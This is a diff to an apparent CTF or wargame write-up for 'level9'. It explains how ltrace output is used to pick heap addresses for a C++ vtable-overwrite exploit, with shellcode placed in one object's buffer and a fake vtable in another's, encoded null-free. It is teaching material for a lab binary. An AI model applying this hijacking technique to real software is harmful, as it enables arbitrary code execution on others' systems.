@@ -293,21 +293,37 @@ We use the same null-byte-free shellcode from **level2** (24 bytes):
 
 ### Address Selection
 
-Why `0x804a00c` and `0x804a07c`?
-
+**From ltrace, we discover:**
+```bash
+$ ltrace ./level9 AAAA
+_Znwj(108, ...)  = 0x804a008  ← obj1 allocated
+_Znwj(108, ...)  = 0x804a078  ← obj2 allocated
 ```
-Shellcode location:   0x804a00c (byte 0 - start of payload)
-Target address:       0x804a00c ← Shellcode starts here
 
-Encoded: \x0c\xa0\x04\x08
-All bytes: 0x0c ✅, 0xa0 ✅, 0x04 ✅, 0x08 ✅
-No null bytes!
-
-Fake vtable location: 0x804a07c (where we write the shellcode address)
-Encoded: \x7c\xa0\x04\x08
-All bytes: 0x7c ✅, 0xa0 ✅, 0x04 ✅, 0x08 ✅
-No null bytes!
+**Calculate addresses:**
 ```
+obj1 base:              0x804a008
+obj1 annotation buffer: 0x804a00c (obj1 + 4) ← Shellcode goes here
+
+obj2 base:              0x804a078
+obj2 vtable pointer:    0x804a078 (obj2 + 0) ← Overwrite target
+obj2 annotation buffer: 0x804a07c (obj2 + 4) ← Use as fake vtable!
+```
+
+**Why `0x804a07c` as fake vtable?**
+- Bytes 108-111 overwrite obj2's vtable pointer (at `0x804a078`)
+- Bytes 112-115 overflow into obj2's annotation buffer (at `0x804a07c`)
+- We point the vtable to `0x804a07c`, then place our shellcode address there
+- Clever: we're using obj2's own memory space as the fake vtable!
+
+**Addresses used in payload:**
+
+| Address | Little-endian | Purpose |
+|---------|---------------|---------|
+| `0x0804a00c` | `\x0c\xa0\x04\x08` | Shellcode location (obj1 annotation buffer) |
+| `0x0804a07c` | `\x7c\xa0\x04\x08` | Fake vtable location (obj2 annotation buffer) |
+
+Both addresses are null-free! ✅
 
 ### Complete Execution Flow
 
